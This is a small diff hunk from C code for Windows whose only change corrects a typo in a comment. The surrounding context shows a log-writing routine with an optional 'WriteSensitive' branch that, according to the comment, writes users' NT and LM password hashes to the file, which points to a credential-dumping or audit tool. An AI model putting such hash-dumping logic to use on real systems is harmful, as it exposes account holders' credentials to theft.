@@ -60,7 +60,7 @@ WriteLogFile(
 			WriteFile(hFile, szTokenFlagBuffer, token_flag_length * sizeof(WCHAR), &dwWritten, NULL);
 		WriteFile(hFile, L",", sizeof(WCHAR), &dwWritten, NULL);
 
-		// In case you want to be a little offensive - write the user's NT and LM passwor values
+		// In case you want to be a little offensive - write the user's NT and LM password values
 		if (WriteSensitive) {
 			if (UserAll->NtPasswordPresent)
 			{
